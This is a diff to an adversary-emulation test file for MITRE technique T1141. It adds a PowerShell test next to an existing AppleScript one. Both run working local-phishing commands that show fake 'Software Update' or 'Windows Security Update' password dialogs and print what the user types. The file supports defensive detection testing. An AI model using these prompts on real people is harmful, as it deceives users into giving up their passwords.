@@ -3,7 +3,7 @@ attack_technique: T1141
 display_name: Input Prompt
 
 atomic_tests:
-- name: Prompt User for Password
+- name: AppleScript - Prompt User for Password
   description: |
     Prompt User for Password (Local Phishing)
     Reference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
@@ -16,3 +16,18 @@ atomic_tests:
     name: sh
     command: |
       osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'
+
+atomic_tests:
+- name: PowerShell - Prompt User for Password
+  description: |
+    Prompt User for Password (Local Phishing) as seen in Stitch RAT.
+
+    Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: command_prompt
+    command: |
+      powershell.exe -command {$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); echo $cred.GetNetworkCredential().Password;}
